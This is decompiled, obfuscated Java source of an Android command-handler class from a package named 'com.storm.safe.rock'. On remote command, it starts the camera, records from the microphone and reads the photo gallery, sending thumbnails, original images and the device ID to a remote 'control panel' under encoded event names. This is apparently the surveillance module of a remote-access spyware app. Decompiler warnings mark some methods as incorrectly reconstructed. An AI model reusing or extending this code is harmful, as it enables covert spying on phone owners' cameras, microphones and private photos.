package com.storm.safe.rock.service.modules.command;

import android.content.ContentResolver;
import android.provider.Settings;
import com.storm.safe.rock.manager.C0258a0;
import com.storm.safe.rock.manager.C0259a1;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.Serializable;
import java.util.Set;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.jvm.internal.Ref$IntRef;
import org.json.JSONException;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.b81;
import p000.k20;
import p000.kg1;
import p000.l20;
import p000.m10;
import p000.t60;
import p000.te0;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a6 */
/* loaded from: classes2.dex */
public final class C0349a6 implements InterfaceC0726jp {

    /* renamed from: a0 */
    public long f53596a0;

    static {
        new te0(null);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("CAMERA_START", "CAMERA_STOP", "CAMERA_SWITCH", "MICROPHONE_SET_CONFIG", "MICROPHONE_START_RECORDING", "MICROPHONE_STOP_RECORDING", "ALBUM_READ_THUMBNAILS", "ALBUM_STOP", "ALBUM_GET_ORIGINAL");
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:4:0x001d  */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        C0259a1 c0259a1;
        C0259a1 c0259a12;
        C0260a2 c0260a2;
        String strOptString;
        boolean zM213775a2;
        l20 l20Var;
        C1351vv c1351vv = C1351vv.f60710b1;
        switch (str.hashCode()) {
            case -1916691063:
                if (str.equals("MICROPHONE_STOP_RECORDING")) {
                    t60.m214714d6("MediaCmdHandler", "停止麦克风录音");
                    try {
                        dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                        try {
                            t60.m214714d6("dqtvuisjd", "🎤 停止麦克风录音");
                            c0259a1 = dqtvuisjdVar.f52455i6;
                        } catch (Exception e) {
                            t60.m214705c6("dqtvuisjd", "停止麦克风录音失败", e);
                        }
                        if (c0259a1 == null) {
                            t60.m214724f2("microphoneManager");
                            throw null;
                        }
                        c0259a1.m211256a5();
                        t60.m214714d6("MediaCmdHandler", "麦克风录音已停止");
                    } catch (Exception e2) {
                        t60.m214705c6("MediaCmdHandler", "停止麦克风录音失败", e2);
                    }
                }
                return c1351vv;
            case -1652345176:
                if (str.equals("CAMERA_START")) {
                    t60.m214714d6("MediaCmdHandler", "[控制面板] 启动JPEG摄像头");
                    try {
                        if (uz0Var.f60536a0.checkSelfPermission("android.permission.CAMERA") == 0) {
                            uz0Var.f60536a0.m211527m5();
                            t60.m214714d6("MediaCmdHandler", "JPEG摄像头已启动");
                            C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
                            if (c0323a8M214869a5 != null) {
                                String strM212470a0 = StringUtil.m212470a0("KFgcP185Mz1DMDlNFD4=");
                                JSONObject jSONObject2 = new JSONObject();
                                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                                jSONObject2.put("type", "jpeg");
                                c0323a8M214869a5.m211658c4(strM212470a0, jSONObject2);
                            }
                        } else {
                            t60.m214726f4("MediaCmdHandler", "没有摄像头权限，弹出权限请求");
                            C0323a8 c0323a8M214869a52 = uz0Var.m214869a5();
                            if (c0323a8M214869a52 != null) {
                                String strM212470a02 = StringUtil.m212470a0("KFgcP185MytFIyRL");
                                JSONObject jSONObject3 = new JSONObject();
                                jSONObject3.put("error", "正在请求摄像头权限，请在手机上授权后重试");
                                jSONObject3.put("needPermission", true);
                                c0323a8M214869a52.m211658c4(strM212470a02, jSONObject3);
                            }
                        }
                    } catch (Exception e3) {
                        t60.m214705c6("MediaCmdHandler", "启动JPEG摄像头失败", e3);
                        C0323a8 c0323a8M214869a53 = uz0Var.m214869a5();
                        if (c0323a8M214869a53 != null) {
                            String strM212470a03 = StringUtil.m212470a0("KFgcP185MytFIyRL");
                            JSONObject jSONObject4 = new JSONObject();
                            String message = e3.getMessage();
                            if (message == null) {
                                message = "启动失败";
                            }
                            jSONObject4.put("error", message);
                            c0323a8M214869a53.m211658c4(strM212470a03, jSONObject4);
                        }
                    }
                }
                return c1351vv;
            case -331559950:
                if (str.equals("ALBUM_STOP")) {
                    t60.m214714d6("MediaCmdHandler", "停止获取相册");
                    try {
                        l20 l20Var2 = uz0Var.f60536a0.f52454i5;
                        l20 l20Var3 = l20Var2 != null ? l20Var2 : null;
                        if (l20Var3 != null) {
                            l20Var3.f57822a1 = true;
                        }
                        t60.m214714d6("MediaCmdHandler", "已停止获取相册");
                    } catch (Exception e4) {
                        t60.m214705c6("MediaCmdHandler", "停止获取相册失败", e4);
                    }
                }
                return c1351vv;
            case -53301028:
                if (str.equals("CAMERA_STOP")) {
                    t60.m214714d6("MediaCmdHandler", "停止JPEG摄像头");
                    try {
                        uz0Var.m214887c3();
                        t60.m214714d6("MediaCmdHandler", "JPEG摄像头已停止");
                        C0323a8 c0323a8M214869a54 = uz0Var.m214869a5();
                        if (c0323a8M214869a54 != null) {
                            String strM212470a04 = StringUtil.m212470a0("KFgcP185Mz1DPjtJFD4=");
                            JSONObject jSONObject5 = new JSONObject();
                            jSONObject5.put(PollingXHR.Request.EVENT_SUCCESS, true);
                            c0323a8M214869a54.m211658c4(strM212470a04, jSONObject5);
                        }
                    } catch (Exception e5) {
                        t60.m214705c6("MediaCmdHandler", "停止JPEG摄像头失败", e5);
                    }
                }
                return c1351vv;
            case 145207551:
                if (str.equals("MICROPHONE_START_RECORDING")) {
                    t60.m214714d6("MediaCmdHandler", "[控制面板] 启动麦克风录音");
                    try {
                        try {
                            c0260a2 = uz0Var.f60536a0.f52369a0;
                        } catch (Exception e6) {
                            t60.m214705c6("dqtvuisjd", "检查麦克风权限失败", e6);
                        }
                        if (c0260a2 == null) {
                            t60.m214724f2("permissionGranter");
                            throw null;
                        }
                        zM211305b3 = c0260a2.m211305b3();
                        if (zM211305b3) {
                            dqtvuisjd dqtvuisjdVar2 = uz0Var.f60536a0;
                            try {
                                t60.m214714d6("dqtvuisjd", "🎤 开始麦克风录音");
                                c0259a12 = dqtvuisjdVar2.f52455i6;
                            } catch (Exception e7) {
                                t60.m214705c6("dqtvuisjd", "开始麦克风录音失败", e7);
                            }
                            if (c0259a12 == null) {
                                t60.m214724f2("microphoneManager");
                                throw null;
                            }
                            c0259a12.m211255a4();
                            t60.m214714d6("MediaCmdHandler", "麦克风录音已启动");
                        } else {
                            t60.m214726f4("MediaCmdHandler", "没有麦克风权限，弹出权限请求");
                            C0323a8 c0323a8M214869a55 = uz0Var.m214869a5();
                            if (c0323a8M214869a55 != null) {
                                String strM212470a05 = StringUtil.m212470a0("JlASKEIoBCFZNBRcAyhCKg==");
                                JSONObject jSONObject6 = new JSONObject();
                                jSONObject6.put("error", "正在请求麦克风权限，请在手机上授权后重试");
                                jSONObject6.put("needPermission", true);
                                c0323a8M214869a55.m211658c4(strM212470a05, jSONObject6);
                            }
                        }
                    } catch (Exception e8) {
                        t60.m214705c6("MediaCmdHandler", "启动麦克风录音失败", e8);
                    }
                }
                return c1351vv;
            case 319917454:
                if (str.equals("CAMERA_SWITCH")) {
                    Object objM211882a3 = m211882a3(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv);
                    if (objM211882a3 == CoroutineSingletons.f57606a0) {
                        return objM211882a3;
                    }
                }
                return c1351vv;
            case 1031975082:
                if (str.equals("ALBUM_GET_ORIGINAL")) {
                    String strOptString2 = jSONObject != null ? jSONObject.optString("contentUri", "") : null;
                    if (strOptString2 == null) {
                        strOptString2 = "";
                    }
                    String strOptString3 = jSONObject != null ? jSONObject.optString("id", "") : null;
                    String str2 = strOptString3 != null ? strOptString3 : "";
                    t60.m214714d6("MediaCmdHandler", "获取原图: ".concat(strOptString2));
                    l20 l20Var4 = uz0Var.f60536a0.f52454i5;
                    l20 l20Var5 = l20Var4 != null ? l20Var4 : null;
                    if (l20Var5 != null) {
                        C0323a8 c0323a8M214869a56 = uz0Var.m214869a5();
                        try {
                            String strM213773a0 = l20Var5.m213773a0(strOptString2);
                            if (strM213773a0 == null || c0323a8M214869a56 == null) {
                                t60.m214726f4("MediaCmdHandler", "获取原图失败或 NetworkManager 未初始化");
                            } else {
                                String strM212470a06 = StringUtil.m212470a0("LFgdNkgqFRFYIyJeGDRMNDMnWjAsXA==");
                                JSONObject jSONObject7 = new JSONObject();
                                jSONObject7.put("id", str2);
                                jSONObject7.put("contentUri", strOptString2);
                                jSONObject7.put("imageData", strM213773a0);
                                jSONObject7.put("timestamp", System.currentTimeMillis());
                                c0323a8M214869a56.m211658c4(strM212470a06, jSONObject7);
                                t60.m214714d6("MediaCmdHandler", "原图已发送");
                            }
                        } catch (Exception e9) {
                            t60.m214705c6("MediaCmdHandler", "获取原图失败", e9);
                        }
                    }
                    CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                    return c1351vv;
                }
                return c1351vv;
            case 1421121556:
                if (str.equals("MICROPHONE_SET_CONFIG")) {
                    t60.m214714d6("MediaCmdHandler", "设置麦克风配置");
                    if (jSONObject != null) {
                        try {
                            strOptString = jSONObject.optString("qualityMode", "STANDARD");
                        } catch (Exception e10) {
                            t60.m214705c6("MediaCmdHandler", "设置麦克风配置失败", e10);
                        }
                    } else {
                        strOptString = null;
                    }
                    String str3 = strOptString != null ? strOptString : "STANDARD";
                    String str4 = "VOICE_RECOGNITION";
                    String strOptString4 = jSONObject != null ? jSONObject.optString("audioSource", "VOICE_RECOGNITION") : null;
                    if (strOptString4 != null) {
                        str4 = strOptString4;
                    }
                    float fOptDouble = jSONObject != null ? (float) jSONObject.optDouble("volumeGain", 1.0d) : 1.0f;
                    boolean zOptBoolean = jSONObject != null ? jSONObject.optBoolean("noiseSuppression", true) : true;
                    uz0Var.m214883b9(str3);
                    uz0Var.m214881b7(str4);
                    uz0Var.m214884c0(fOptDouble);
                    uz0Var.m214882b8(zOptBoolean);
                    t60.m214714d6("MediaCmdHandler", "麦克风配置已更新: 音质=" + str3 + ", 音源=" + str4 + ", 增益=" + fOptDouble + "x, 降噪=" + zOptBoolean);
                }
                return c1351vv;
            case 1967153504:
                if (str.equals("ALBUM_READ_THUMBNAILS")) {
                    int iOptInt = jSONObject != null ? jSONObject.optInt("limit", 9999) : 9999;
                    int iOptInt2 = jSONObject != null ? jSONObject.optInt("thumbnailSize", 200) : 200;
                    t60.m214714d6("MediaCmdHandler", "[控制面板] 获取相册缩略图: limit=" + iOptInt + ", size=" + iOptInt2);
                    try {
                        l20Var = uz0Var.f60536a0.f52454i5;
                    } catch (Exception e11) {
                        t60.m214705c6("dqtvuisjd", "检查相册权限失败", e11);
                        zM213775a2 = false;
                    }
                    if (l20Var == null) {
                        t60.m214724f2("galleryManager");
                        throw null;
                    }
                    zM213775a2 = l20Var.m213775a2();
                    if (zM213775a2) {
                        l20 l20Var6 = uz0Var.f60536a0.f52454i5;
                        l20 l20Var7 = l20Var6 != null ? l20Var6 : null;
                        if (l20Var7 != null) {
                            final C0323a8 c0323a8M214869a57 = uz0Var.m214869a5();
                            final ContentResolver contentResolver = uz0Var.f60536a0.getContentResolver();
                            try {
                                final Ref$IntRef ref$IntRef = new Ref$IntRef();
                                l20Var7.m213776a3(iOptInt, iOptInt2, new m10() { // from class: com.storm.safe.rock.service.modules.command.MediaCommandHandler$handleAlbumReadThumbnails$3
                                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                                    {
                                        super(3);
                                    }

                                    @Override // p000.m10
                                    /* renamed from: a1 */
                                    public final Object mo211537a1(Object obj, Object obj2, Serializable serializable) throws JSONException {
                                        k20 k20Var = (k20) obj;
                                        int iIntValue = ((Number) obj2).intValue();
                                        int iIntValue2 = ((Number) serializable).intValue();
                                        t60.m214695b6(k20Var, "item");
                                        ref$IntRef.f57624a0 = iIntValue2;
                                        C0323a8 c0323a8 = c0323a8M214869a57;
                                        if (c0323a8 != null) {
                                            String string = Settings.Secure.getString(contentResolver, "android_id");
                                            if (string == null) {
                                                string = "unknown";
                                            }
                                            String strM212470a07 = StringUtil.m212470a0("LFgdNkgqFRFePCpeFAVeORorUw==");
                                            JSONObject jSONObject8 = new JSONObject();
                                            jSONObject8.put("id", String.valueOf(k20Var.f57420a0));
                                            jSONObject8.put("deviceId", string);
                                            jSONObject8.put("index", iIntValue);
                                            jSONObject8.put("displayName", k20Var.f57421a1);
                                            jSONObject8.put("dateAdded", k20Var.f57422a2);
                                            jSONObject8.put("mimeType", k20Var.f57423a3);
                                            jSONObject8.put("width", k20Var.f57424a4);
                                            jSONObject8.put("height", k20Var.f57425a5);
                                            jSONObject8.put("size", k20Var.f57426a6);
                                            jSONObject8.put("contentUri", k20Var.f57427a7);
                                            String str5 = k20Var.f57428a8;
                                            if (str5 == null) {
                                                str5 = "";
                                            }
                                            jSONObject8.put("thumbnail", str5);
                                            jSONObject8.put("timestamp", System.currentTimeMillis());
                                            jSONObject8.put("total", iIntValue2);
                                            c0323a8.m211658c4(strM212470a07, jSONObject8);
                                        }
                                        return C1351vv.f60710b1;
                                    }
                                });
                                if (ref$IntRef.f57624a0 == 0) {
                                    t60.m214726f4("MediaCmdHandler", "相册为空，没有获取到图片数据");
                                    if (c0323a8M214869a57 != null) {
                                        String strM212470a07 = StringUtil.m212470a0("LFgdNkgqFRFSIzlWAw==");
                                        JSONObject jSONObject8 = new JSONObject();
                                        jSONObject8.put(PollingXHR.Request.EVENT_SUCCESS, false);
                                        jSONObject8.put("error", "获取不到数据");
                                        jSONObject8.put("count", 0);
                                        jSONObject8.put("message", "相册中没有图片或无法读取");
                                        c0323a8M214869a57.m211658c4(strM212470a07, jSONObject8);
                                    }
                                }
                                t60.m214714d6("MediaCmdHandler", "相册缩略图获取完成，共 " + ref$IntRef.f57624a0 + " 张");
                            } catch (Exception e12) {
                                t60.m214705c6("MediaCmdHandler", "获取相册缩略图失败", e12);
                                if (c0323a8M214869a57 != null) {
                                    String strM212470a08 = StringUtil.m212470a0("LFgdNkgqFRFSIzlWAw==");
                                    JSONObject jSONObject9 = new JSONObject();
                                    jSONObject9.put(PollingXHR.Request.EVENT_SUCCESS, false);
                                    jSONObject9.put("error", "获取不到数据");
                                    String message2 = e12.getMessage();
                                    if (message2 == null) {
                                        message2 = "读取相册失败";
                                    }
                                    jSONObject9.put("message", message2);
                                    c0323a8M214869a57.m211658c4(strM212470a08, jSONObject9);
                                }
                            }
                        }
                    } else {
                        t60.m214726f4("MediaCmdHandler", "没有相册权限，弹出权限请求");
                        C0323a8 c0323a8M214869a58 = uz0Var.m214869a5();
                        if (c0323a8M214869a58 != null) {
                            String strM212470a09 = StringUtil.m212470a0("LFgdNkgqFRFSIzlWAw==");
                            JSONObject jSONObject10 = new JSONObject();
                            jSONObject10.put("error", "正在请求相册权限，请在手机上授权后重试");
                            jSONObject10.put("needPermission", true);
                            c0323a8M214869a58.m211658c4(strM212470a09, jSONObject10);
                        }
                    }
                    CoroutineSingletons coroutineSingletons2 = CoroutineSingletons.f57606a0;
                    return c1351vv;
                }
                return c1351vv;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:46:0x00bb, code lost:
    
        if (p000.b81.m210571b1(200, r5) == r6) goto L47;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001d  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211882a3(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        MediaCommandHandler$handleCameraSwitch$1 mediaCommandHandler$handleCameraSwitch$1;
        uz0 uz0Var2;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof MediaCommandHandler$handleCameraSwitch$1) {
            mediaCommandHandler$handleCameraSwitch$1 = (MediaCommandHandler$handleCameraSwitch$1) continuationImpl;
            int i = mediaCommandHandler$handleCameraSwitch$1.f53519a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                mediaCommandHandler$handleCameraSwitch$1.f53519a3 = i - Integer.MIN_VALUE;
            } else {
                mediaCommandHandler$handleCameraSwitch$1 = new MediaCommandHandler$handleCameraSwitch$1(this, continuationImpl);
            }
        }
        Object obj = mediaCommandHandler$handleCameraSwitch$1.f53517a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = mediaCommandHandler$handleCameraSwitch$1.f53519a3;
        try {
            if (i2 == 0) {
                kg1.m213544f4(obj);
                String strOptString = jSONObject != null ? jSONObject.optString("cameraType", "front") : null;
                t60.m214714d6("MediaCmdHandler", "切换JPEG摄像头: ".concat(strOptString != null ? strOptString : "front"));
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (jCurrentTimeMillis - this.f53596a0 < 1500) {
                    t60.m214726f4("MediaCmdHandler", "切换摄像头太频繁，忽略请求");
                    return c1351vv;
                }
                this.f53596a0 = jCurrentTimeMillis;
                uz0Var.m214887c3();
                uz0Var2 = uz0Var;
                mediaCommandHandler$handleCameraSwitch$1.f53516a0 = uz0Var2;
                mediaCommandHandler$handleCameraSwitch$1.f53519a3 = 1;
                if (b81.m210571b1(300L, mediaCommandHandler$handleCameraSwitch$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i2 != 1) {
                if (i2 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                uz0Var2 = mediaCommandHandler$handleCameraSwitch$1.f53516a0;
                kg1.m213544f4(obj);
                uz0Var2.f60536a0.m211527m5();
                t60.m214714d6("MediaCmdHandler", "JPEG摄像头已切换");
                return c1351vv;
            }
            uz0Var2 = mediaCommandHandler$handleCameraSwitch$1.f53516a0;
            kg1.m213544f4(obj);
            C0258a0 c0258a0 = uz0Var2.f60536a0.f52371a2;
            if (c0258a0 == null) {
                c0258a0 = null;
            }
            if (c0258a0 != null) {
                c0258a0.m211249a8();
            }
            t60.m214702c3("MediaCmdHandler", "当前摄像头: " + (c0258a0 != null ? c0258a0.m211245a4() : null));
            mediaCommandHandler$handleCameraSwitch$1.f53516a0 = uz0Var2;
            mediaCommandHandler$handleCameraSwitch$1.f53519a3 = 2;
        } catch (Exception e) {
            t60.m214705c6("MediaCmdHandler", "切换摄像头失败", e);
            return c1351vv;
        }
    }
}
